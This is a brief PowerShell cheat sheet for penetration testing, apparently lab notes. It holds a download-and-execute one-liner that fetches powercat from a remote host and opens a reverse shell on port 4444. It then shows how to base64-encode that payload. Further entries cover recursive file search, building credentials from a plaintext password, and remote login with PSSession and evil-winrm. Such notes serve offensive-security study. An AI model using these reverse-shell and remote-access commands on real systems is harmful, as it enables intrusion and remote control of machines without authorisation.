# Powershell scripting 

## Download 
### Downloading with `iwr` Cmdlet 
```powershell
iwr -uri http://<IP>/file.txt -Outfile file.txt
```

## Powercat 
The following sample code defines a reverse shell usage with powercat : 
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

encoding to base64 with `pwsh` in kali :
```powershell
$reverse_shell = 'IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell'

$Bytes_revshell = [System.text.Encoding]::Unicode.GetBytes($reverse_shell)

$Encoded_revshell = [Convert]::ToBase64String($Bytes_revshell)

$Encoded_revshell

SQBFA......WA
```


## Search

- To search for a specific file :
```powershell
Get-ChildItem -Path C:\ -Include <filename> -File -Recurse -ErrorAction SilentlyContinue

```


## Session and Password handling 

### Creating PSCredential object

```powershell
$password = ConvertTo-SecureString "password123" -AsPlaintText -Force

$cred = New-Object System.Management.Automation.PSCredential("admin", $password)
```

### Connecting to PSSession
the `$cred` version is a PSCredential Object : 
```powershell 
Enter-PSSession -ComputerName CLIENT01 -Credential $cred 
```

### Using `evil-winrm`
Using `evil-winrm` could avoid running into some undefined behavior in a normal WinRM Session: 
```powershell
evil-winrm -i <IP> -u <user> -p "<password>"
```
